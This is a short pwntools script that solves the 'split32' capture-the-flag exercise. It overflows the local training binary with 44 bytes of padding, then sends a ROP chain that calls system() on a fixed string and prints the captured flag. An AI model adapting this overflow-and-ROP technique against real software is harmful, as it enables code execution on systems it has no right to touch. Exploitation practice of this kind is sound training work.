from pwn import *

try:
    io.close()
except:
    pass

context.clear(arch='i386')

# context.log_level	= 'debug'
context.terminal	= ['/home/a5/client-pwn.sh']

filename			= './split32'

elf = ELF(filename)

io = process(filename)

junk = cyclic(44)

r = ROP(elf)
r.call(elf.plt['system'], [0x0804a030])
r.call('main')

payload = junk + r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))